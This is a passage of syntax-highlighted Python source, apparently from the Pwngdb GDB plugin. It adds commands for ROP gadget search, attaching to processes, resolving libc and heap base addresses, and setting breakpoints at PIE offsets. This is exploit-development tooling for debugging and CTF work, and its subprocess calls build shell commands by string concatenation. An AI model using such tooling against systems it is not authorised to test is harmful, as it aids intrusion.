</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="nb">type</span><span class="p">))</span> <span class="ow">in</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">items</span><span class="p">(),</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="p">[</span><span class="mi">1</span><span class="p">]):</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%s</span><span class="s2"> = 0x</span><span class="si">%x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">start</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">rop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; ROPgadget &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">procname</span> <span class="o">=</span> <span class="n">getprocname</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">procname</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s2">&#34;ROPgadget --binary </span><span class="se">\&#34;</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">procname</span> <span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;No current process or executable file specified.&#34;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">findcall</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="o">*</span><span class="n">arg</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; Find some function call &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">sym</span><span class="p">,)</span><span class="o">=</span> <span class="n">normalize_argv</span><span class="p">(</span><span class="n">arg</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">output</span> <span class="o">=</span> <span class="n">searchcall</span><span class="p">(</span><span class="n">sym</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">at</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="o">*</span><span class="n">arg</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; Attach by processname &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">processname</span><span class="p">,)</span> <span class="o">=</span> <span class="n">normalize_argv</span><span class="p">(</span><span class="n">arg</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">processname</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">processname</span> <span class="o">=</span> <span class="n">getprocname</span><span class="p">(</span><span class="n">relative</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">processname</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Attaching program: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;No executable file specified.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Use the </span><span class="se">\&#34;</span><span class="s2">file</span><span class="se">\&#34;</span><span class="s2"> or </span><span class="se">\&#34;</span><span class="s2">exec-file</span><span class="se">\&#34;</span><span class="s2"> command.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Attaching to </span><span class="si">%s</span><span class="s2"> ...&#34;</span> <span class="o">%</span> <span class="n">processname</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">pidlist</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="s2">&#34;pidof &#34;</span> <span class="o">+</span> <span class="n">processname</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;attach &#34;</span> <span class="o">+</span> <span class="n">pidlist</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="n">getheapbase</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">libcbase</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">codeaddr</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">ldbase</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span> <span class="s2">&#34;No such process&#34;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">bcall</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="o">*</span><span class="n">arg</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; Set the breakpoint at some function call &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">sym</span><span class="p">,)</span><span class="o">=</span> <span class="n">normalize_argv</span><span class="p">(</span><span class="n">arg</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">call</span> <span class="o">=</span> <span class="n">searchcall</span><span class="p">(</span><span class="n">sym</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;not found&#34;</span> <span class="ow">in</span> <span class="n">call</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;symbol not found&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">ispie</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">                <span class="n">codebaseaddr</span><span class="p">,</span><span class="n">codeend</span> <span class="o">=</span> <span class="n">codeaddr</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">callbase</span> <span class="ow">in</span> <span class="n">call</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span> 
</span></span><span class="line"><span class="cl">                    <span class="n">addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">callbase</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="n">codebaseaddr</span>
</span></span><span class="line"><span class="cl">                    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;b*&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">callbase</span> <span class="ow">in</span>  <span class="n">call</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">callbase</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;b*&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">boff</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="o">*</span><span class="n">arg</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; Set the breakpoint at some offset from base address &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">sym</span><span class="p">,)</span> <span class="o">=</span> <span class="n">normalize_argv</span><span class="p">(</span><span class="n">arg</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">codebaseaddr</span><span class="p">,</span><span class="n">codeend</span> <span class="o">=</span> <span class="n">codeaddr</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">sym</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">bpoff</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">bpoff</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">sym</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;b*&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">codebaseaddr</span> <span class="o">+</span> <span class="n">sym</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">y</span> <span class="o">=</span> <span class="n">x</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">prevbp</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">rstrip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">tboff</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="o">*</span><span class="n">arg</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; Set temporary breakpoint at some offset from base address &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">sym</span><span class="p">,)</span> <span class="o">=</span> <span class="n">normalize_argv</span><span class="p">(</span><span class="n">arg</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">codebaseaddr</span><span class="p">,</span><span class="n">codeend</span> <span class="o">=</span> <span class="n">codeaddr</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;tb*&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">codebaseaddr</span> <span class="o">+</span> <span class="n">sym</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">atboff</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="o">*</span><span class="n">arg</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; Attach and set breakpoints accordingly &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">sym</span><span class="p">,)</span> <span class="o">=</span> <span class="n">normalize_argv</span><span class="p">(</span><span class="n">arg</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;attach &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">sym</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">prevbp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">x</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">i</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">prevbp</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;del &#34;</span> <span class="o">+</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">            <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">x</span> <span class="o">-=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">bpoff</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">boff</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">doff</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="o">*</span><span class="n">arg</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; Delete the breakpoint using breakpoint number at some offset from base address &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">sym</span><span class="p">,)</span> <span class="o">=</span> <span class="n">normalize_argv</span><span class="p">(</span><span class="n">arg</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">str</span><span class="p">(</span><span class="n">sym</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">prevbp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">        <span class="n">codebaseaddr</span><span class="p">,</span><span class="n">codeend</span> <span class="o">=</span> <span class="n">codeaddr</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;i b &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">sym</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">y</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">4</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">codebaseaddr</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;del &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">sym</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">bpoff</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">prevbp</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">sym</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">xo</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="o">*</span><span class="n">arg</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; Examine at offset from base address &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">_</span><span class="p">,</span><span class="n">arg1</span><span class="p">,)</span> <span class="o">=</span> <span class="n">normalize_argv</span><span class="p">(</span><span class="n">arg</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;x&#34;</span> <span class="o">+</span> <span class="n">arg</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">arg1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">codebaseaddr</span><span class="p">,</span><span class="n">_</span> <span class="o">=</span> <span class="n">codeaddr</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">cmd</span> <span class="o">+=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">codebaseaddr</span> <span class="o">+</span> <span class="n">arg1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">PwngdbCmd</span><span class="p">(</span><span class="n">gdb</span><span class="o">.</span><span class="n">Command</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34; Pwngdb command wrapper &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">super</span><span class="p">(</span><span class="n">PwngdbCmd</span><span class="p">,</span><span class="bp">self</span><span class="p">)</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="s2">&#34;pwngdb&#34;</span><span class="p">,</span><span class="n">gdb</span><span class="o">.</span><span class="n">COMMAND_USER</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">try_eval</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">expr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">gdb</span><span class="o">.</span><span class="n">parse_and_eval</span><span class="p">(</span><span class="n">expr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1">#print(&#34;Unable to parse expression: {}&#34;.format(expr))</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">expr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">eval_argv</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">expressions</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; Leave command alone, let GDB parse and evaluate arguments &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[</span><span class="n">expressions</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">+</span> <span class="p">[</span> <span class="bp">self</span><span class="o">.</span><span class="n">try_eval</span><span class="p">(</span><span class="n">expr</span><span class="p">)</span> <span class="k">for</span> <span class="n">expr</span> <span class="ow">in</span> <span class="n">expressions</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">invoke</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">args</span><span class="p">,</span><span class="n">from_tty</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">dont_repeat</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Don&#39;t eval expression in PwngdbCmd commands</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#expressions = gdb.string_to_argv(args)</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#arg = self.eval_argv(expressions)</span>
</span></span><span class="line"><span class="cl">        <span class="n">arg</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">arg</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">cmd</span> <span class="o">=</span> <span class="n">arg</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">cmd</span> <span class="ow">in</span> <span class="n">pwncmd</span><span class="o">.</span><span class="n">commands</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">func</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">pwncmd</span><span class="p">,</span><span class="n">cmd</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">func</span><span class="p">(</span><span class="o">*</span><span class="n">arg</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Unknown command&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Unknown command&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">PwngdbAlias</span><span class="p">(</span><span class="n">gdb</span><span class="o">.</span><span class="n">Command</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34; Pwngdb Alias &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">alias</span><span class="p">,</span><span class="n">command</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">command</span> <span class="o">=</span> <span class="n">command</span>
</span></span><span class="line"><span class="cl">        <span class="nb">super</span><span class="p">(</span><span class="n">PwngdbAlias</span><span class="p">,</span><span class="bp">self</span><span class="p">)</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="n">alias</span><span class="p">,</span><span class="n">gdb</span><span class="o">.</span><span class="n">COMMAND_NONE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">invoke</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">args</span><span class="p">,</span><span class="n">from_tty</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">dont_repeat</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%s</span><span class="s2"> </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">command</span><span class="p">,</span><span class="n">args</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getarch</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">capsize</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">word</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">arch</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;show arch&#39;</span><span class="p">,</span><span class="n">to_string</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">tmp</span> <span class="o">=</span>  <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;currently.*&#34;</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">tmp</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">info</span> <span class="o">=</span> <span class="n">tmp</span><span class="o">.</span><span class="n">group</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;x86-64&#34;</span> <span class="ow">in</span> <span class="n">info</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">capsize</span> <span class="o">=</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">            <span class="n">word</span> <span class="o">=</span> <span class="s2">&#34;gx &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;x86-64&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;x86-64&#34;</span>
